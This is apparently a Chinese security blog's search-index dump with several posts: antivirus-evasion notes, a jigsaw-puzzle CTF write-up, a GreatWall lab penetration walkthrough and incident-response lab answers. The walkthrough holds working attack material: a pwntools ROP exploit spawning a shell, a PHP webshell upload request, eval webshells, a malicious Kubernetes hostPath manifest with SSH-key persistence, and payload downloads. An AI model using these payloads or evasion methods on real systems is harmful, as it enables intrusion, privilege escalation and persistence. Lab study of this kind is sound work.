(unhook/syscall/VEH) 3.行为分析沙箱里可以监视木马程序的行为。 杀软排除项：某些安全软件允许用户定义例外规则。(编译目录、白名单) 关闭杀毒软件：检测是否有试图关闭或禁用安全软件的动作。(w3C服务、BYOVD技术) 释放文件：进行文件读写。 网路连接：存在网络请求。 修改注册表：检测对系统注册表的非正常修改。 线程远程注入：监控是否有向其他进程注入代码的行为。 进程替换/内存隐藏：检查是否存在未授权的进程替换或内存区域隐藏。(PAGE GUARD) 堆栈欺骗：干扰堆栈跟踪，使得调试器难以跟随执行流程。 反分析：反虚拟机、反调试。 提权绕过：监控是否有尝试提升权限的行为。(烂土豆) 4.其他分析 开发过程中避免安装某些安全软件：防止源代码泄露或受到不必要的监视。 某些安全软件采用机器学习引擎(如QVM)，利用一套智能算法学习海量的病毒文件以及正常文件，得出数据模型区分病毒和正常文件，不断适应新的病毒变化。 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:2:1","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#3行为分析"},{"categories":["penetration"],"content":"\r检测方式\r1.静态分析通过对文件特征、内存进行扫描，可以检测恶意软件的静态特征。 文件静态特征、内存静态特征查杀技术 特征码：杀软通过查找恶意软件特有的二进制模式来识别 ​ VirTest 5.0 熵值检测：高熵值可能表明文件经过了加密或压缩 ​ pestudio，熵值大于7，高度混淆 文件信誉度：如360晶核对白文件的信誉度评估 导出表IAT隐藏：修改导入地址表（IAT）以隐藏函数调用 ​ StudyPE+ （x64）1.11 build112 加壳脱壳：增加额外层防止直接读取原始代码（VMP加壳） 2.动态分析通过hook技术可以实现对任意程序的监控，监控关键API调用等。 主动防御、沙箱等查杀技术。 沙箱：模拟运行环境以观察程序的行为。 识别沙箱：检测本地环境是否安装微信等社交软件 启发式扫描：杀软如果发现可以输入的参数会进行随机参数输入测试 云查杀：使用云端数据库来检测未知威胁。 进程调用链：监控进程之间的交互以发现异常行为。 API Hook技术：监控API调用来检测潜在的恶意活动。 (unhook/syscall/VEH) 3.行为分析沙箱里可以监视木马程序的行为。 杀软排除项：某些安全软件允许用户定义例外规则。(编译目录、白名单) 关闭杀毒软件：检测是否有试图关闭或禁用安全软件的动作。(w3C服务、BYOVD技术) 释放文件：进行文件读写。 网路连接：存在网络请求。 修改注册表：检测对系统注册表的非正常修改。 线程远程注入：监控是否有向其他进程注入代码的行为。 进程替换/内存隐藏：检查是否存在未授权的进程替换或内存区域隐藏。(PAGE GUARD) 堆栈欺骗：干扰堆栈跟踪，使得调试器难以跟随执行流程。 反分析：反虚拟机、反调试。 提权绕过：监控是否有尝试提升权限的行为。(烂土豆) 4.其他分析 开发过程中避免安装某些安全软件：防止源代码泄露或受到不必要的监视。 某些安全软件采用机器学习引擎(如QVM)，利用一套智能算法学习海量的病毒文件以及正常文件，得出数据模型区分病毒和正常文件，不断适应新的病毒变化。 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:2:1","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#4其他分析"},{"categories":["penetration"],"content":"\r特征码查杀方式大型APT组织的攻击样本对啊看那个动态扫描能力强，通过特征码有几率捕获APT事件样本。 修改特征码virusTest 多态病毒使用通常的特征码扫描无法检测的病毒。 避免被检测的方法： 使用不固定的密钥或随机数加密病毒代码 在病毒运行过程中改变病毒代码 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:2:2","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#特征码查杀方式"},{"categories":["penetration"],"content":"\r特征码查杀方式大型APT组织的攻击样本对啊看那个动态扫描能力强，通过特征码有几率捕获APT事件样本。 修改特征码virusTest 多态病毒使用通常的特征码扫描无法检测的病毒。 避免被检测的方法： 使用不固定的密钥或随机数加密病毒代码 在病毒运行过程中改变病毒代码 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:2:2","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#修改特征码"},{"categories":["penetration"],"content":"\r特征码查杀方式大型APT组织的攻击样本对啊看那个动态扫描能力强，通过特征码有几率捕获APT事件样本。 修改特征码virusTest 多态病毒使用通常的特征码扫描无法检测的病毒。 避免被检测的方法： 使用不固定的密钥或随机数加密病毒代码 在病毒运行过程中改变病毒代码 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:2:2","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#多态病毒"},{"categories":["penetration"],"content":"\rAI介入安全Qvm对抗 加入一些白文件特征进行伪造 ","date":"2024-10-13","objectID":"/anti-antivirus_base/:3:0","series":null,"tags":["penetration"],"title":"星盟免杀基础","uri":"/anti-antivirus_base/#ai介入安全"},{"categories":["misc","wp"],"content":"记一misc拼图题 初始图片 先剪裁 from PIL import Image # 打开完整的拼接图像 full_image = Image.open(r\"C:\\Users\\scofi\\Desktop\\pintu\\flag.jpg\") full_width, full_height = full_image.size # 定义每个小图像的尺寸和间距 small_width, small_height = 300, 225 padding = 25 border = 25 # 添加白色边框大小 # 计算行列数 num_cols = (full_width - border) // (small_width + padding) num_rows = (full_height - border) // (small_height + padding) print(f\"总共有 {num_rows} 行和 {num_cols} 列小图像.\") # 分割并保存小图像、 counter = 1 for row in range(num_rows): for col in range(num_cols): left = border + col * (small_width + padding) top = border + row * (small_height + padding) right = left + small_width bottom = top + small_height print(f\"正在处理第 {counter} 张小图像：左上角坐标 ({left}, {top}), 右下角坐标 ({right}, {bottom})\") # Crop the small image small_image = full_image.crop((left, top, right, bottom)) # Convert to RGB mode (if not already in RGB) if small_image.mode != 'RGB': small_image = small_image.convert('RGB') # Save the small image small_image.save(r\"C:\\Users\\scofi\\Desktop\\pintu\\{counter}.jpg\".format(counter=counter)) counter += 1 print(\"所有小图像已保存完成.\") 裁切后发现，每个小块并不是正方形，不方便拼图 将每一个块保存为新的正方形图片 from PIL import Image import os # 输入文件夹路径 input_folder = r\"C:\\Users\\scofi\\Desktop\\pintu\" # 输出文件夹路径 output_folder = r\"C:\\Users\\scofi\\Desktop\\pintu\\out\" # 指定正方形的边长 square_size = 50 # 默认边长为256 # 确保输出文件夹存在 if not os.path.exists(output_folder): os.makedirs(output_folder) def process_images(input_folder, output_folder, square_size=None): for i in range(1, 401): input_path = os.path.join(input_folder, f\"{i}.jpg\") output_path = os.path.join(output_folder, f\"{i}.jpg\") # 打开图片 img = Image.open(input_path) # 根据是否指定边长来进行处理 if square_size: new_img = img.resize((square_size, square_size)) else: width, height = img.size new_size = min(width, height) new_img = img.resize((new_size, new_size)) # 保存为新的正方形图片 new_img.save(output_path) process_images(input_folder, output_folder, square_size) ","date":"2024-10-09","objectID":"/jigsaw_puzzle/:0:0","series":null,"tags":["misc","wp"],"title":"misc_拼图题","uri":"/jigsaw_puzzle/#"},{"categories":["misc","wp"],"content":"\rMontage+gaps拼图","date":"2024-10-09","objectID":"/jigsaw_puzzle/:1:0","series":null,"tags":["misc","wp"],"title":"misc_拼图题","uri":"/jigsaw_puzzle/#montagegaps拼图"},{"categories":["misc","wp"],"content":"\rmontagemontage 是 ImageMagick套件中的一个工具，它可以用来拼接多个图像文件成一张大图。 安装 ImageMagick： sudo apt-get install imagemagick 使用 montage： 基本命令格式： montage [options] image1.jpg [image2.jpg ...] output.jpg 其中，image1.jpg、image2.jpg 等是你想要拼接的图像文件，output.jpg 是拼接后的输出文件名。 拼接参数： .tile：用于指定拼接的布局，格式为 rowsxcolumns。例如，-tile 2x3 表示将图像分成 2 行 3 列。 -geometry：用于指定每个图像块的大小和位置。例如，-geometry +0+0 表示没有间隙地拼接图像。 -gaps：在图像之间添加间隙，例如 -gaps 10x10。 montage 输入文件路径 -tile 长宽数量 -geometry 拼图间隙 输出路径 montage *.png -tile 20x20 -geometry +0+0 flag.png 使用montage重新拼接得到下图 ","date":"2024-10-09","objectID":"/jigsaw_puzzle/:1:1","series":null,"tags":["misc","wp"],"title":"misc_拼图题","uri":"/jigsaw_puzzle/#montage"},{"categories":["misc","wp"],"content":"\rgaps git clone https://github.com/nemanja-m/gaps.git cd gaps pip install -r requirements.txt sudo apt-get install python-tk pip install -e . 如果没有requirements.txt，可手动安装 numpy opencv-python matplotlib pytest pillow gaps参数 --size：拼图块的像素尺寸。如果不确定，gaps 可以自动检测。 --generations：遗传算法的代数。 --population：种群中的个体数量。 --verbose：每一代训练结束后展示最佳结果。 --save：将拼图解决方案保存为图像。 对montage拼合的图案进行自动拼图 gaps run flag.png out.png --generations=20 --population=1000 --size=50 --debug 如果拼图结果不理想，可以尝试调整 --generations 和 --population 参数，以增加迭代次数和种群大小。 ","date":"2024-10-09","objectID":"/jigsaw_puzzle/:1:2","series":null,"tags":["misc","wp"],"title":"misc_拼图题","uri":"/jigsaw_puzzle/#gaps"},{"categories":["misc","wp"],"content":"\r小插曲我的kali起初安装gaps失败，gaps命令仍为白色 执行gaps，kali会提示你：command not found，并询问安装mummer以执行gaps。 但mummer并不是我们需要的工具，若不小心安装了mummer，可以在终端执行以下操作将其删除： sudo apt remove mummer sudo apt autoclean sudo apt autoremove 安装gaps时的报错信息 我们的 path 变量里并没有包含 gaps 的安装路径，需要手动添加： 以root状态在终端输入nano /etc/environment 在PATH=\"/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin\"中加入\":/home/kali/.local/bin\" (其中kali为用户名） #生效方法：系统重启 #有效期限：永久有效 #用户局限：对所有用户 ","date":"2024-10-09","objectID":"/jigsaw_puzzle/:2:0","series":null,"tags":["misc","wp"],"title":"misc_拼图题","uri":"/jigsaw_puzzle/#小插曲"},{"categories":["penetration","wp"],"content":"第一届长城杯半决赛渗透题赛后复现 在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了6个Flag，它们分布在不同的靶机上，您需要找到并获取这些 Flag 作为您的成就目标。 ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:0:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#"},{"categories":["penetration","wp"],"content":"\r8.130.13.188（172.28.23.17）\r扫描端口，发现8080后台登陆段 thinkphp框架， 5.0.23 RCE的nday 直接getshell 蚁剑连过去，在根目录找到第一个flag 查看网卡信息 上传fscan扫描内网网段 （起初fscan反应不正常，后来发现是蚁剑连接的问题，直接将输出结果写入result） 发现内网资产，上传frp内网穿透+proxifier代理，将shell的内网流量转发出来 ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:0:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#813013188172282317"},{"categories":["penetration","wp"],"content":"\r内网一层代理 # frp_0.53.2 nohup /tmp/frpc -c /tmp/frpc.toml \u0026 # Proxifier socks5 \u003cyour-ip\u003e \u003cyour-port\u003e （这里踩了许多坑…..） ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:0:2","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#内网一层代理"},{"categories":["penetration","wp"],"content":"\r第一层","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:1:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#第一层"},{"categories":["penetration","wp"],"content":"\r172.28.23.33- ERP 后台转发出来之后，通过本地直接访问目标内网资产 根据fscan的扫描结果可知是Shiro框架+heapdump泄露 172.28.23.33:8080/actuator/heapdump 随后 java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump 得到shiro-key 注入内存马，冰蝎连过去 当前为普通用户权限，应该是要提权 查看主机开放端口 netstat -tulnp 在/home/ops01目录下发现HashNote文件 对 HashNote 进行分析。程序对 password 做了校验，username 输入任意值均可。 password 值： freep@ssw0rd:3 提权脚本:https://www.dr0n.top/posts/f249db01/ from pwn import * context.arch='amd64' def add(key,data='b'): p.sendlineafter(b'Option:',b'1') p.sendlineafter(b'Key:',key) p.sendlineafter(b'Data:',data) def show(key): p.sendlineafter(b'Option:',b'2') p.sendlineafter(b\"Key: \",key); def edit(key,data): p.sendlineafter(b'Option:',b'3') p.sendlineafter(b'Key:',key) p.sendlineafter(b'Data:',data) def name(username): p.sendlineafter(b'Option:',b'4') p.sendlineafter(b'name:',username) p = remote('172.28.23.33', 59696) # p = process('./HashNote') username=0x5dc980 stack=0x5e4fa8 ukey=b'\\x30'*5+b'\\x31'+b'\\x44' fake_chunk=flat({ 0:username+0x10, 0x10:[username+0x20,len(ukey),\\ ukey,0], 0x30:[stack,0x10] },filler=b'\\x00') p.sendlineafter(b'name',fake_chunk) p.sendlineafter(b'word','freep@ssw0rd:3') add(b'\\x30'*1+b'\\x31'+b'\\x44',b'test') # 126 add(b'\\x30'*2+b'\\x31'+b'\\x44',b'test') # 127 show(ukey) main_ret=u64(p.read(8))-0x1e0 rdi=0x0000000000405e7c # pop rdi ; ret rsi=0x000000000040974f # pop rsi ; ret rdx=0x000000000053514b # pop rdx ; pop rbx ; ret rax=0x00000000004206ba # pop rax ; ret syscall=0x00000000004560c6 # syscall fake_chunk=flat({ 0:username+0x20, 0x20:[username+0x30,len(ukey),\\ ukey,0], 0x40:[main_ret,0x100,b'/bin/sh\\x00'] },filler=b'\\x00') name(fake_chunk.ljust(0x80,b'\\x00')) payload=flat([ rdi,username+0x50, rsi,0, rdx,0,0, rax,0x3b, syscall ]) p.sendlineafter(b'Option:',b'3') p.sendlineafter(b'Key:',ukey) p.sendline(payload) p.sendlineafter(b'Option:',b'9') p.interactive() \u003ewhoami root 进入/root目录得到flag3 vmware的流量挂proxifier代理： 摘自先知社区：https://xz.aliyun.com/t/13167 很多时候，作为攻击队，我们都需要在纯净的武器库虚拟机中完成自己的渗透（因为蜜罐会尝试获取浏览器Cookie和本地文件，用自己的实体机很快就能被溯源），如何直接让所有的虚拟机都走上代理呢？ 注：本文这个方法，无视任何类型的系统类型和对应配置，只要配置VM网卡出网即可被代理 如下配置： 应用程序填写如下： vmware.exe; vmnetcfg.exe; vmnat.exe; vmrun.exe; vmware-vmx.exe; mkssandbox.exe; vmware-hostd.exe; vmnat.exe; vmnetdhcp.exe VM虚拟机17以上版本-特别补充 之前有挺多师傅反馈VMware 17以上版本无法将流量代理出来，苦于本地没装VMware 17，一直没空尝试，今天终于和 nack0c 师傅研究出了解决方法： 在“配置文件”的“高级”处，选择“服务与其他用户”，然后勾选上两个选项： 勾选上就可以解决VMware 17以上的版本无法代理的问题啦~祝师傅们玩的开心哈哈~ 如果还是代理不上，请尝试本文的 3.4 补充 里面按操作导入配置文件 上传fscan扫描该网段，得到：172.22.10.28 ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:1:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#172282333--erp-后台"},{"categories":["penetration","wp"],"content":"\r172.28.23.26- 新翔 OA在之前的fscan扫描结果中发现有ftp可匿名登陆 ftp连过去 get OASystem.zip 从main.php开始进行代码审计，开头引入了db.php和checklogin.php checklogin.php中 \u003c?php function islogin(){ if(isset($_COOKIE['id'])\u0026\u0026isset($_COOKIE['loginname'])\u0026\u0026isset($_COOKIE['jueseid'])\u0026\u0026isset($_COOKIE['danweiid'])\u0026\u0026isset($_COOKIE['quanxian'])){ if($_COOKIE['id']!=''\u0026\u0026$_COOKIE['loginname']!=''\u0026\u0026$_COOKIE['jueseid']!=''\u0026\u0026$_COOKIE['danweiid']!=''\u0026\u0026$_COOKIE['quanxian']!=''){ return true; } else { return false; } } else { return false; } } ?\u003e Cookie: id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1 直接登录main.php 源码根目录下还有一个uploadbase64.php \u003c?php /** * Description: PhpStorm. * Author: yoby * DateTime: 2018/12/4 18:01 * Email:logove@qq.com * Copyright Yoby版权所有 */ $img = $_POST['imgbase64']; if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $img, $result)) { $type = \".\".$result[2]; $path = \"upload/\" . date(\"Y-m-d\") . \"-\" . uniqid() . $type; } $img = base64_decode(str_replace($result[1], '', $img)); @file_put_contents($path, $img); exit('{\"src\":\"'.$path.'\"}'); 对于上传的校验不完整，只要符合格式是data:image/xxx;base64,xxx这种就行 POST /uploadbase64.php HTTP/1.1 Host: 172.28.23.26 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 76 imgbase64=data:image/php;base64,PD89YCRfR0VUWzFdYDtldmFsKCRfUE9TVFsxXSk7Pz4= 用蚁剑的插件绕过disable_functions（大部分功能只支持Linux系统） 成功后，再创建一个GET一句话木马/upload/1.php，将.antproxy.php第37行的url改成/upload/1.php #/upload/1.php \u003c?php eval($_GET[1]);?\u003e 访问.antproxy.php（相当于访问没有disabled_functions的1.php文件），执行系统命令，发现base32有suid，可进行利用 不能直接读flag02.txt 执行find / -perm -u=s -type f 2\u003e/dev/null，发现base32有suid权限，可以利用 ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:1:2","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#172282326--新翔-oa"},{"categories":["penetration","wp"],"content":"\r内网信息收集\r上传fscan，扫描172.22.14.0/24网段 http://172.28.23.26/upload/.antproxy.php?a=system(\"wget http://172.28.23.17:8080/fscan\"); ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:1:3","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#内网信息收集"},{"categories":["penetration","wp"],"content":"\r内网二层代理172.28.23.17 chmod +x frps nohup ./frps -c frps.ini \u0026 172.28.23.33 chmod +x frpc nohup ./frpc -c frpc.ini \u0026 Proxifier Chains socks5 \u003cyour-ip\u003e \u003cyour-port\u003e socks5 172.28.23.17 \u003cyour-port\u003e 代理链 代理规则 第二层打通，扫一下172.22.14.0/24网段 成功访问 Harbor： ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:1:4","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#内网二层代理"},{"categories":["penetration","wp"],"content":"\r第二层","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:2:0","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#第二层"},{"categories":["penetration","wp"],"content":"\r172.22.14.46- Harbor\rHarbor 公开镜像仓库未授权访问 CVE-2022-46463 https://github.com/404tk/CVE-2022-46463 Linux 环境下运行 harbor.py python3 harbor.py http://172.22.14.46/ 公开镜像一：harbor/secr python3 harbor.py http://172.22.14.46/ --dump harbor/secret --v2 随后分析镜像文件，找到 flag05： 公开镜像二：project/projectadmin python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2 分析镜像文件，发现运行了 run.sh，内容如下： ProjectAdmin-0.0.1-SNAPSHOT.jar。反编译，在 SpringBoot 配置文件 application.properties 中找到数据库账号密码： spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8\u0026useUnicode=true\u0026serverTimezone=UTC spring.datasource.username=root spring.datasource.password=My3q1i4oZkJm3 spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver MySQL UDF 提权（flag06）\r再写一个规则，连上mysql MDUT直接梭 折腾了好一顿才用这个工具连上 工具自身的mysql驱动目录配置有问题 ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:2:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#172221446--harbor"},{"categories":["penetration","wp"],"content":"\r172.22.14.46- Harbor\rHarbor 公开镜像仓库未授权访问 CVE-2022-46463 https://github.com/404tk/CVE-2022-46463 Linux 环境下运行 harbor.py python3 harbor.py http://172.22.14.46/ 公开镜像一：harbor/secr python3 harbor.py http://172.22.14.46/ --dump harbor/secret --v2 随后分析镜像文件，找到 flag05： 公开镜像二：project/projectadmin python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2 分析镜像文件，发现运行了 run.sh，内容如下： ProjectAdmin-0.0.1-SNAPSHOT.jar。反编译，在 SpringBoot 配置文件 application.properties 中找到数据库账号密码： spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8\u0026useUnicode=true\u0026serverTimezone=UTC spring.datasource.username=root spring.datasource.password=My3q1i4oZkJm3 spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver MySQL UDF 提权（flag06）\r再写一个规则，连上mysql MDUT直接梭 折腾了好一顿才用这个工具连上 工具自身的mysql驱动目录配置有问题 ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:2:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#公开镜像一harborsecr"},{"categories":["penetration","wp"],"content":"\r172.22.14.46- Harbor\rHarbor 公开镜像仓库未授权访问 CVE-2022-46463 https://github.com/404tk/CVE-2022-46463 Linux 环境下运行 harbor.py python3 harbor.py http://172.22.14.46/ 公开镜像一：harbor/secr python3 harbor.py http://172.22.14.46/ --dump harbor/secret --v2 随后分析镜像文件，找到 flag05： 公开镜像二：project/projectadmin python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2 分析镜像文件，发现运行了 run.sh，内容如下： ProjectAdmin-0.0.1-SNAPSHOT.jar。反编译，在 SpringBoot 配置文件 application.properties 中找到数据库账号密码： spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8\u0026useUnicode=true\u0026serverTimezone=UTC spring.datasource.username=root spring.datasource.password=My3q1i4oZkJm3 spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver MySQL UDF 提权（flag06）\r再写一个规则，连上mysql MDUT直接梭 折腾了好一顿才用这个工具连上 工具自身的mysql驱动目录配置有问题 ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:2:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#公开镜像二projectprojectadmin"},{"categories":["penetration","wp"],"content":"\r172.22.14.46- Harbor\rHarbor 公开镜像仓库未授权访问 CVE-2022-46463 https://github.com/404tk/CVE-2022-46463 Linux 环境下运行 harbor.py python3 harbor.py http://172.22.14.46/ 公开镜像一：harbor/secr python3 harbor.py http://172.22.14.46/ --dump harbor/secret --v2 随后分析镜像文件，找到 flag05： 公开镜像二：project/projectadmin python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2 分析镜像文件，发现运行了 run.sh，内容如下： ProjectAdmin-0.0.1-SNAPSHOT.jar。反编译，在 SpringBoot 配置文件 application.properties 中找到数据库账号密码： spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8\u0026useUnicode=true\u0026serverTimezone=UTC spring.datasource.username=root spring.datasource.password=My3q1i4oZkJm3 spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver MySQL UDF 提权（flag06）\r再写一个规则，连上mysql MDUT直接梭 折腾了好一顿才用这个工具连上 工具自身的mysql驱动目录配置有问题 ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:2:1","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#mysql-udf-提权flag06"},{"categories":["penetration","wp"],"content":"\r172.22.14.37- k8s（k8s这块实在不会，照着人家wp打的） k8s kubelet 10250端口未授权，但是不符合利用条件 还有一个6443端口的Api Server未授权 编辑恶意yaml apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment labels: app: nginx spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:1.8 volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / 创建pod kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f evil.yaml 列出pod kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default 进容器 kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment-864f8bfd6f-zfgqd /bin/bash 写公钥 echo \"ssh-rsa xxxx\" \u003e /mnt/root/.ssh/authorized_keys ssh连接，在数据库中得到flag 读取flag ","date":"2024-09-03","objectID":"/chunqiuyunjing-greatwall/:2:2","series":null,"tags":["penetration","wp"],"title":"春秋云境-GreatWall综合渗透","uri":"/chunqiuyunjing-greatwall/#172221437--k8s"},{"categories":["wp","emergency"],"content":"玄机应急响应靶场刷题wp https://xj.edisec.net/ ","date":"2024-06-11","objectID":"/xj_emergency/:0:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#"},{"categories":["wp","emergency"],"content":"\r第一章 应急响应-Linux入侵排查1.web目录存在木马，请找到木马的密码提交 flag{1} 使用D盾扫描Linux主机Webshell https://winfsp.dev/rel/ 安装完成后我们就可以通过右键“此电脑”-\u003e“映射网络驱动器”进行挂载，首次连接时需要验证SSH用户密码 \\\\sshfs\\root@192.168.1.120 //映射home目录 \\\\sshfs\\root@192.168.1.120\\/ //映射/根目录 \\\\sshfs.r\\root@192.168.1.120 //映射/根目录 \\\\sshfs.r\\root@192.168.1.120!1234 //映射/根目录（其他端口） 然后用d盾扫描linux的www目录 也可以用net use命令将Linux根目录映射挂载到本地，Z为映射的磁盘盘符，这里也需要验证SSH用户密码。 net use //列出所有网络连接 net use Z: /del //删除本机映射的Z盘 net use * /del /y //删除所有映射和IPC$ net use Z: \\\\sshfs\\root@192.168.1.120\\/ //将对方根目录映射为Z盘 net use Z: \\\\sshfs.r\\root@192.168.1.120 //将对方根目录映射为Z盘 net use Z: \\\\sshfs.r\\root@192.168.1.120!1234 //将对方根目录映射为Z盘（其他端口） 2.服务器疑似存在不死马，请找到不死马的密码提交 flag{hello} md5爆破得到不死马的密码hello 3.不死马是通过哪个文件生成的，请提交文件名 flag{index.php} 见上题 4.黑客留下了木马文件，请找出黑客的服务器ip提交 flag{10.11.55.21} 可疑文件，放到云沙箱分析一下 5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交 flag(3333) 在Linux环境中执行一下 同时netstat查看连接远端的端口 ","date":"2024-06-11","objectID":"/xj_emergency/:1:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第一章-应急响应-linux入侵排查"},{"categories":["wp","emergency"],"content":"\r第一章 应急响应-webshell查杀1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx} flag{027ccd04-5065-48b6-a32d-77c704a5e26d} 映射Linux的根目录到本地，d盾扫描www目录 \\\\sshfs.r\\root@43.192.44.224 在include/gz.php中发现flag 2.黑客使用的什么工具的shell github地址的md5 flag{md5} flag{39392de3218c333f794befef07ac9257} 根据gz.php(文件名)，以及shell的php代码特征可判断为哥斯拉webshell https://github.com/BeichenDream/Godzilla 计算md5得到flag 3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx flag{aebac0e58cd6c5fad1695ee4d1ac1919} 隐藏webshell为/var/www/html/include/Db/.Mysqli.php 4.黑客免杀马完整路径 md5 flag{md5} flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de} 结合d盾查杀结果，并根据其代码可判断免杀马为/var/www/html/wap/top.php ","date":"2024-06-11","objectID":"/xj_emergency/:2:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第一章-应急响应-webshell查杀"},{"categories":["wp","emergency"],"content":"\r第一章 应急响应-Linux日志分析1.有多少IP在爆破主机ssh的root帐号，如果有多个使用\",“分割 小到大排序 例如flag{192.168.200.1,192.168.200.2} flag{192.168.200.2,192.168.200.32,192.168.200.31} cd /var/log cat auth.log.1 | grep -a \"Failed password for root\" | awk '{print $11}' | sort | uniq -c | sort -nr | more 2.ssh爆破成功登陆的IP是多少，如果有多个使用”,“分割 flag{192.168.200.2} cat auth.log.1 | grep -a \"Accepted \" | awk '{print $11}' | sort | uniq -c | sort -nr | more 3.爆破用户名字典是什么？如果有多个使用”,“分割 flag{user,hello,root,test3,test2,test1} cat auth.log.1 | grep -a \"Failed password\" | perl -e 'while($_=\u003c\u003e){ /for(.*?) from/; print \"$1\\n\";}'| uniq -c | sort -nr 4.成功登录 root 用户的 ip 一共爆破了多少次 flag{4} 结合问题1和2可知 5.黑客登陆主机后新建了一个后门用户，用户名是多少 flag{test2} cat auth.log.1 |grep -a \"new user\" ","date":"2024-06-11","objectID":"/xj_emergency/:3:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第一章-应急响应-linux日志分析"},{"categories":["wp","emergency"],"content":"\r第二章 日志分析-redis应急响应1.通过本地 PC 